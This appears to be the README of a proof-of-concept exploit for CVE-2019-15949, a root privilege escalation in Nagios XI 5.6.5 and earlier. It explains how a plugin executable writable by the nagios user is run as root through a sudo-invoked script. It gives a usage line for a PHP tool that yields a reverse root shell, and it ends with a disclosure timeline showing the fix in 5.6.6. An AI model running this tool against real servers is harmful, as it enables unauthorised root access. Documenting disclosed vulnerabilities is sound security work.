# nagiosxi-root-exploit

### Overview
A vulnerability exists in Nagios XI <= 5.6.5 allowing an attacker to leverage an RCE to escalate privileges to root.  
The exploit requires access to the server as the 'nagios' user, or CCM access via the web interface with perissions to manage plugins.

### Details
The `getprofile.sh` script, invoked by downloading a system profile (profile.php?cmd=download), is executed as root via a passwordless sudo entry; the script executes the ‘check_plugin’ executuable which is owned by the nagios user.
A user logged into Nagios XI with permissions to modify plugins, or the 'nagios' user on the server, can modify the ‘check_plugin’ executable and insert malicious commands exectuable as root.

### POC
A PHP POC has been developed which uploads a payload resulting in a reverse root shell.  
Usage:  
`php privesc.php --host=example.com --ssl=[true/false] --user=username --pass=password --reverseip=ip --reverseport=port`

### Discolusure
Reported to Nagios on: 29th July 2019  
Confirmed by Nagios on: 29th July 2019  
Fixed in version: 5.6.6 on: 20th August 2019  
CVE Assigned on: 6th September 2019 (CVE-2019-15949 https://nvd.nist.gov/vuln/detail/CVE-2019-15949)  

![alt text](https://i.imgur.com/fl0zwSE.png)
